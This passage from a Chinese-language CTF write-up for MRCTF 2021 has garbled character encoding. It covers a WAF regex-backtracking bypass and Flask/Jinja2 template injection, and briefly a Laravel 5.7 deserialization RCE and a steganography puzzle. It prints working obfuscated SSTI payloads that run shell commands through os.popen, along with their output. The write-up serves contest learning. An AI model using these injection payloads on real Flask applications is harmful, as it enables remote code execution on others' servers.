punctuation">(</span>pat<span class="token punctuation">,</span>url<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"BLOCK"</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment"># æ‹¦æˆª</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"PASS"</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment"># ä¸æ‹¦æˆª</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>waf<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"PASS"</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>å¯ä»¥æ³¨æ„åˆ°å¦‚æœè¶…æ—¶äº†çš„è¯ <code>except</code> é‡Œä¹Ÿæ˜¯ PASSã€‚</p><p>å¦å¤–å‘ç° server æ˜¯ gunicornï¼Œæºç ä¹Ÿæ˜¯ pythonï¼Œç›²çŒœæ˜¯ flask æ¨¡æ¿æ³¨å…¥ã€‚</p><p>å‘ç°è²Œä¼¼å¯ä»¥æ­£åˆ™å›æº¯è¶…æ—¶+ç©ºè¡Œç»•è¿‡ã€‚</p><pre class="language-none"><code class="language-none">xadsfadsfadsfas.dfasdf-asdf-adsfadsf.lajds.-92341012dsfasf8.5.mrctf.fun{{161*1651}}eGFkc2ZhZHNmYWRzZmFzLmRmYXNkZi1hc2RmLWFkc2ZhZHNmLmxhamRzLi05MjM0MTAxMmRzZmFzZjguNS5tcmN0Zi5mdW4Ke3sxNjEqMTY1MX19GET /api/spider/eGFkc2ZhZHNmYWRzZmFzLmRmYXNkZi1hc2RmLWFkc2ZhZHNmLmxhamRzLi05MjM0MTAxMmRzZmFzZjguNS5tcmN0Zi5mdW4Ke3sxNjEqMTY1MX19</code></pre><p>è¿”å›</p><p><img src="/2021/04/15/CTF_2021MRCTF/image-20210411200800302.png"></p><p>è¯» <code>/</code></p><pre class="language-none"><code class="language-none">{{""["\x5f\x5fcla""ss\x5f\x5f"]["\x5f\x5fba""se\x5f\x5f"]["\x5f\x5fsubcla""sses\x5f\x5f"]()[408]["\x5f\x5fin""it\x5f\x5f"]["\x5f\x5fglo""bals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls -al /")["read"]()}}http://node.mrctf.fun:15000/api/spider/eGFkc2ZhZHNmYWRzZmFzLmRmYXNkZi1hc2RmLWFkc2ZhZHNmLmxhamRzLi05MjM0MTAxMmRzZmFzZjguNS5tcmN0Zi5mdW4Ke3siIlsiXHg1Zlx4NWZjbGEiInNzXHg1Zlx4NWYiXVsiXHg1Zlx4NWZiYSIic2VceDVmXHg1ZiJdWyJceDVmXHg1ZnN1YmNsYSIic3Nlc1x4NWZceDVmIl0oKVs0MDhdWyJceDVmXHg1ZmluIiJpdFx4NWZceDVmIl1bIlx4NWZceDVmZ2xvIiJiYWxzXHg1Zlx4NWYiXVsiXHg1Zlx4NWZidWlsdGluc1x4NWZceDVmIl1bIlx4NWZceDVmaW1wb3J0XHg1Zlx4NWYiXSgib3MiKVsicG9wZW4iXSgibHMgLWFsIC8iKVsicmVhZCJdKCl9fQ==è®¿é—®'xadsfadsfadsfas.dfasdf-asdf-adsfadsf.lajds.-92341012dsfasf8.5.mrctf.funtotal 88drwxr-xr-x   1 root root 4096 Apr 11 11:55 .drwxr-xr-x   1 root root 4096 Apr 11 11:55 ..-rwxr-xr-x   1 root root    0 Apr 11 10:05 .dockerenvdr-xr-xr-x   1 root root 4096 Apr 11 10:05 appdrwxr-xr-x   1 root root 4096 Mar 30 23:04 bindrwxr-xr-x   2 root root 4096 Mar 19 23:44 bootdrwxr-xr-x   5 root root  340 Apr 11 10:05 devdrwxr-xr-x   1 root root 4096 Apr 11 10:05 etc-rw-r--r--   1 root root    2 Apr 11 11:55 flagdrwxr-xr-x   2 root root 4096 Mar 19 23:44 homedrwxr-xr-x   1 root root 4096 Mar 30 23:04 libdrwxr-xr-x   2 root root 4096 Mar 29 00:00 lib64drwxr-xr-x   2 root root 4096 Mar 29 00:00 mediadrwxr-xr-x   2 root root 4096 Mar 29 00:00 mntdrwxr-xr-x   2 root root 4096 Mar 29 00:00 optdr-xr-xr-x 507 root root    0 Apr 11 10:05 procdrwx------   1 root root 4096 Apr 11 10:05 rootdrwxr-xr-x   3 root root 4096 Mar 29 00:00 rundrwxr-xr-x   1 root root 4096 Mar 30 23:03 sbindrwxr-xr-x   2 root root 4096 Mar 29 00:00 srvdr-xr-xr-x  13 root root    0 Apr 11 10:05 sysdrwxrwxrwt   1 root root 4096 Apr 11 10:05 tmpdrwxr-xr-x   1 root root 4096 Mar 29 00:00 usrdrwxr-xr-x   1 root root 4096 Mar 29 00:00 var'å¤±è´¥ï¼</code></pre><p>whoami ==&gt; root</p><p>è¯» flag</p><pre class="language-none"><code class="language-none">xadsfadsfadsfas.dfasdf-asdf-adsfadsf.lajds.-92341012dsfasf8.5.mrctf.fun{{""["\x5f\x5fcla""ss\x5f\x5f"]["\x5f\x5fba""se\x5f\x5f"]["\x5f\x5fsubcla""sses\x5f\x5f"]()[408]["\x5f\x5fin""it\x5f\x5f"]["\x5f\x5fglo""bals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("cat /flag")["read"]()}}</code></pre><p><code>MRCTF{eeeeeeeeeeeeeeeeeeeeez_NFA-WAF_8ypaS5!}</code></p><p>è¯»ä¸€ä¸‹é¢˜ç›®æºç  <code>start.py</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>url_for<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template<span class="token keyword">import</span> requests<span class="token punctuation">,</span>base64<span class="token punctuation">,</span>shlex<span class="token punctuation">,</span>osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/waf"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">wafsource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"waf.py"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/source"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">appsource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/spider/&lt;url&gt;"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">spider</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>url <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>safeurl <span class="token operator">=</span> shlex<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>url<span class="token punctuation">)</span>block <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"python3 waf.py "</span> <span class="token operator">+</span> safeurl<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> block <span class="token operator">==</span> <span class="token string">"PASS"</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://"</span><span class="token operator">+</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">return</span> Template<span class="token punctuation">(</span><span class="token string">"è®¿é—®æˆåŠŸ!ç½‘é¡µè¿”å›äº†{}å­—èŠ‚æ•°æ®"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span><span class="token keyword">return</span> Template<span class="token punctuation">(</span><span class="token string">"è®¿é—®{}å¤±è´¥ï¼"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>safeurl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">return</span> Template<span class="token punctuation">(</span><span class="token string">"WAFå·²æ‹¦æˆªï¼Œè¯·ä¸è¦ä¹±è¾“å…¥å‚æ•°ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>å•Š æœ‰ <code>/source</code> æºç æ³„éœ²çš„å•Šï¼ˆï¼ˆä¸‹æ¬¡åšé¢˜å…ˆæ‰«ä¸€æ‰«å¥½äº†</p><blockquote><p>è®²ä¸ªç¬‘è¯ï¼Œè¿™é¢˜æ‰“çš„æ—¶å€™æœ€å¼€å§‹è¿˜è¯»åˆ°æœ‰ flag çš„ï¼Œç„¶åå‘ç°å†…å®¹æ˜¯ <code>1</code>ã€‚</p><p>å†ä¸€è¯»å‘ç°æ²¡ä¸œè¥¿äº†ã€‚å†ä¸€çœ‹æ ¹ç›®å½•ï¼Œflag ä½ å»å“ªäº†â€¦â€¦</p><p>é—®äº†é—®å‡ºé¢˜äºº</p><p><img src="/2021/04/15/CTF_2021MRCTF/image-20210411213829805.png"></p><p>å™¢å¯¹ï¼Œroot æƒé™ xswlï¼</p></blockquote><blockquote><p><strong>Extensive Reading:</strong></p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶</a></p></blockquote><h3 id="ez-larave1"><a href="#ez-larave1" class="headerlink" title="ez_larave1"></a>ez_larave1</h3><blockquote><p><a href="http://node.mrctf.fun:10012/">http://node.mrctf.fun:10012/</a></p><p><a href="https://drive.buptmerak.cn/s/afGBmP8zjg47orG">https://drive.buptmerak.cn/s/afGBmP8zjg47orG</a></p></blockquote><p>æ ¹æ®ä¿®æ”¹æ—¶é—´ï¼Œçœ‹ä¸€çœ‹æœ€è¿‘ä¿®æ”¹çš„æ–‡ä»¶ã€‚</p><p><img src="/2021/04/15/CTF_2021MRCTF/image-20210411024331176.png"></p><p>Laravel ç‰ˆæœ¬ç”¨çš„æ˜¯ 5.7.29ï¼ŒæŸ¥äº†æŸ¥å‘ç°æœ‰ä¸ª RCEã€‚</p><p>ç„¶åè¿™é‡Œçš„ <code>PendingCommand.php</code> æŠŠ <code>__destruct()</code> é‡Œçš„ <code>run</code> ç»™æ³¨é‡Šæ‰äº†ã€‚</p><p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414231340203.png" alt="__destruct"></p><p>ä¹‹åå†å‚è€ƒä¸‹é¢çš„å‡ ç¯‡</p><blockquote><p><a href="https://xz.aliyun.com/t/5510">Laravelå…¥å‘ä¹‹CVE-2019-9081å¤ç°åˆ†æ</a></p><p><a href="http://zeroyu.xyz/2020/06/28/Laravel-5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2019-9081-2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%A2%98%E8%A7%A3/">Laravel 5.7ååºåˆ—åŒ–æ¼æ´(CVE-2019-9081+2020ç¬¬äº”ç©ºé—´é¢˜è§£)</a>   </p></blockquote><p>æ‰¾ä¸ªèƒ½æ‰§è¡Œä»£ç çš„åœ°æ–¹ï¼Œæ‰§è¡Œè¿™ä¸ª <code>run</code> å°±å¥½ã€‚</p><p><em>ï¼ˆåé¢å†æ¥å¤ç°ï¼Œå’•å’•å’•</em></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="plane"><a href="#plane" class="headerlink" title="plane"></a>plane</h3><blockquote><p>This plane cannot fly~~~</p><h3 id="Hint"><a href="#Hint" class="headerlink" title="Hint:"></a>Hint:</h3><ul><li>plane:721x-402y+9110z-1197483=0</li></ul></blockquote><p>![(153, 15, 120),(51, 104, 132),(229, 38, 115)](CTF_2021MRCTF/(153, 15, 120),(51, 104, 132),(229, 38, 115).png)</p><p>å›¾ç‰‡å¥½èŠ±å•Šï¼Œçœ‹äº†ä¸€ä¸‹å‘ç°åœ¨ blue plane ç¬¬7å±‚å­˜åœ¨å¥‡æ€ªçš„ä¸œè¥¿ã€‚</p><p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414233015328.png"></p><p>ç„¶è€Œæå–å‡ºæ¥å•¥ä¹Ÿçœ‹ä¸å‡ºã€‚</p><p>æ ¹æ®é¢˜ç›® hintï¼Œä¼°è®¡æ˜¯è¦æ ¹æ® 721x-402y+9110z-1197483=0 è¿™ä¸ªç©ºé—´å¹³é¢æ¥åˆ’åˆ†å›¾åƒç©ºé—´ï¼Œä¸€åŠæ˜¯é»‘ï¼Œä¸€åŠæ˜¯ç™½ã€‚</p><p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414233411199.png" alt="721x-402y+9110z-1197483=0"></p><p>æŒ‰ç…§é¢˜ç›®æœ¬æ„çš„è¯ï¼Œåº”è¯¥æ˜¯éœ€è¦æ ¹æ® (153, 15, 120), (51, 104, 132), (229, 38, 115) è¿™ä¸‰ä¸ªåæ ‡æ¥æ±‚å‡ºæ‰€ç»™çš„å¹³é¢çš„ï¼Œä¸è¿‡å³ä½¿ç»™å‡ºæ¥äº†å½“æ—¶è¿˜æ˜¯æ²¡æ•´å‡ºæ¥ï¼ˆï¼ˆ</p><p>å†™ä¸ªè„šæœ¬ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span><span class="token triple-quoted-string string">"""MRCTF2021 Misc planeMiaoTony"""</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imageim <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'(153, 15, 120),(51, 104, 132),(229, 38, 115).png'</span><span class="token punctuation">)</span>rgb_im <span class="token operator">=</span> im<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rgb_im<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token comment"># (400, 400)</span>width <span class="token operator">=</span> rgb_im<span class="token punctuation">.</span>widthheight <span class="token operator">=</span> rgb_im<span class="token punctuation">.</span>heightim2 <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> rgb_im<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>        r<span class="token punctuation">,</span> g<span class="token punctuation">,</span> b <span class="token operator">=</span> rgb_im<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token number">721</span><span class="token operator">*</span>r<span class="token operator">-</span><span class="token number">402</span><span class="token operator">*</span>g<span class="token operator">+</span><span class="token number">9110</span><span class="token operator">*</span>b<span class="token operator">-</span><span class="token number">1197483</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            im2<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># im2.show()</span><span class="token comment"># im2.save('test1.png')</span></code></pre><p>å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œå’Œ  blue plane 7 å¾ˆç±»ä¼¼ã€‚ï¼ˆå°±æ˜¯æ¨¡ä»¿ blue plane 7 ç¡®å®šçš„é»‘ç™½ï¼‰</p><p><img src="/2021/04/15/CTF_2021MRCTF/test1.png"></p><p>æ”¾å¤§æ¥çœ‹æ˜¯è¿™æ ·çš„ã€‚</p><p><img src="/2021/04/15/CTF_2021MRCTF/image-20210418002111188.png" alt="æ”¾å¤§æ•ˆæœ"></p><p>å›¾ç‰‡ <strong>çºµå‘æ–¹å‘ä¸Š</strong> å¯ä»¥å‘ç°åˆ†äº†å¾ˆå¤šå±‚ï¼ŒçŒœæƒ³æ˜¯æŠŠäºŒè¿›åˆ¶çš„ ASCII ç¼–ç åˆ°äº†é»‘ç™½åƒç´ ä¸­äº†ã€‚</p><p>æ ¹æ®æœ€å³è¾¹çºµå‘å¯ä»¥ä¼°è®¡æ˜¯ 10000110ï¼Œä¸å¯¹ï¼Œåè¿‡æ¥ï¼Œ01100001ï¼Œæ­£å¥½æ˜¯ ASCII é‡Œçš„ <code>a</code>ã€‚äºæ˜¯éœ€è¦ä¸Šä¸‹åè¿‡æ¥è§£ç ã€‚</p><p>è€Œä¸”è¿˜æ˜¯ä»ä¸Šåˆ°ä¸‹ï¼Œä¸€åˆ—æœ‰50ä¸ªå­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦ä»ä¸Šåˆ°ä¸‹æ˜¯ä½ä½åˆ°é«˜ä½ã€‚</p><p>ï¼ˆå¤ç°çš„æ—¶å€™å…¶å®è¿™é‡Œè¯•äº†å¥½å¤šæ¬¡æ‰å‘ç°çš„â€¦â€¦</p><p>ç„¶åå†™ä¸ªè„šæœ¬è§£ç å§ã€‚ï¼ˆæ¥ä¸Šé¢çš„ï¼‰</p><pre class="language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>    cnt <span class="token operator">=</span> <span class="token number">0</span>    x <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> im2<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token operator">+</span> x        <span class="token keyword">else</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> x        cnt <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> cnt <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token comment"># print(x)</span>            ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment"># print(ch)</span>            data <span class="token operator">+=</span> ch            x <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'result.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre><p>å¤„ç†å¾—åˆ°</p><pre class="language-none"><code class="language-none">Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZadGNFSmxSbGw1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1UyMTRVMkpIZHpGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMVV5TVRSVk1rcElaSHBHVjFaRmIzZFdha1poVjBaT2NtRkhhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZjRWRaTUZaM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOc2NFaGpSbEpUVmxoQ1dsWXhXbE5TTWxGNVVtdGthbEp0VWxsWmJGWmhZMnhXY1ZKdFJsUlNiR3cxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFhXSEJIVkRKU1YxWnVVbWhTYXpWeldXeG9iMWRHV25STlNHUnNVakJzTkZVeWRHdFhSMHBJVld4c1dtSkhhRlJXTUZwVFZqSkdSbFJzVG1sU2JrSmFWMnhXWVZReFdsaFRiRnBZVmtWd1YxbHJXa3RTUmxweFVWaG9hMVpzV2pGV01uaGhZVWRGZUdOR2JGaGhNVnBvVmtSS1QyTXlUa1phUjJoVFRXNW9WVlpHWTNoaU1rbDRWMWhvV0dKRk5WVlVWM1J6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2toaFJsSlhUVVp3VkZacVNrZFNiRkp6Vkcxc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JUVW14d2VGVldhRzloTVZwelYycEdWMDF1YUdoWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5V1ZscEhXVE5vYVUxcmJEUldNV2h2VjBkS1JrNVdWbFZXTTFKNlZHdGFWbVZYVWtoa1JtaFRUVWhDU2xac1pEUmpNV1IwVTJ0a1dHSlhhR0ZVVnpWdlYwWnJlRmRyWkZkV2EzQjZWa2R6TVZkR1NsWmpSV3hYWWxoQ1RGUnJXbEpsUm1SellVWlNhRTFzU25oV1Z6QjRUa2RHUjFaWVpHaFNWVFZWVlcxNGQyVkdWblJOVldSV1RXdHdWMWxyVW1GWFIwVjRZMGhLV2xaWFVrZGFWV1JQVTBVNVYxcEhhR2hOU0VKMlZtMTBVMU14VVhsVmEyUlVZbXR3YjFWcVNtOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZucFdkbFl3V25KbFJtUnlXa1prVjJFelFqWldhMlI2VFZaWmQwMVdXbWxsYTFwWVdXeG9RMU14VWxkYVJWcHNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsV1ZuQlFWa1phWVdReVZrZFdXR3hyVWtWS1dGUldXbmRsVm10M1YyNWtXRkl3VmpSWk1GSlBWakpHY2xkcmVGZGhhM0JRVlRGa1MxSXhjRWRhUms1WFYwVktNbFp0TVRCVk1VMTRWVmhzVlZkSGVGWlpWRVozWWpGV2NWUnJUbGRTYlhoYVdUQmFhMWRHV25OalJteGFUVVpWTVZsV1ZYaGpiVXBGVld4a1RsWXlhREpXTVZwaFV6RkplRlJ1VG1GU2JGcFlXV3RhZDA1c1draGxSMFphVm0xU1IxUnNXbUZWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp0ZUhkTk1XeFdWMjVrVTJKSVFraFdSM2hUVlRKRmVsRnFWbGRTTTJob1ZrUktSMVl4VG5WVmJFSlhVbFJXV1ZaR1l6RmlNV1JIWWtoR1ZHRXhjSE5WYlRGVFYyeGtjbFpVUmxkTlZuQjZXVEJhVjFkR1dYcFZia3BYVmtWYWVsWnFSbGRqTVdSellVZHNWMVp1UWxGV2ExcGhXVmRSZVZaclpGZFhSM2h5Vld0V1MxZEdVbGRYYm1Sc1ZtMTBNMVl5Tld0WFJrbDNWbXBTV2sxR1NsQldha3BIWTJ4a2NtVkdaR2hoTTBKUlZsUkdhMU14U1hoalJXUmhVbXMxV0ZZd1ZrdE5iRnAwVFZSQ1ZrMVZNVFJXVm1oelZsWmtTR1ZHV2xwV1JWb3pXV3BHVjJOV1VuSlViR1JUWWxob05WWnRNREZoTVZsNFYyNU9hbEpGU21oV2JHUk9UVlphV0dNemFGaFNiRm94V1RCYWExUnNXWGxoUkVwWFlXdEtjbFY2Umt0amF6VlhXa1phYVZKc2NGbFdSbEpMWWpGT1YxZHJhR3hTTUZwWVZGZDRTMU5XV2xoa1J6bG9UVlZzTlZsVmFFTldiVXBJWVVWT1lWSkZXbWhaZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFJYaGFSV2hVWWtkb2IxVnFRbUZXYkZwMFpVaGtUazFYZUZkV01qVnJWVEpLU1ZGcmFGZFNNMmhVVmxSS1JtVnNSbkZXYkdSVFRUSm9iMVpyVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGRoYTNCSVdUSjRhMk50VmtkYVJUVlhZbXRLU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlVWndhVmRIYUc5V2JURTBZekpOZUdORmFGQldiVkpVV1d0V2QxZHNXa2hsUjNCUFZteHNORll5TlU5aGJFcFlZVVpzVjJFeFZYaGFSM2h6VmpGYVdXRkhjR2xXV0VKSFZteGtOR0V4VW5OWFdHeG9Va1Z3V0ZsWGRFdGpiRlkyVW10MGFtRjZWbGhYYTFwcllWWktjMk5HYkZkU2JFcElWWHBCTVdNeFpISmhSM1JUVFVad1dWZFhlR0ZaVm1SWFYyeG9hMUo2Ykc5VVZsWjNUVVpzVmxkc1RsZFdiSEJaV1ZWV1UxWnJNWFZoUjJoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGSllhR0ZTVjJoVldXdGtiMkl4Vm5GUmJVWlhZa1p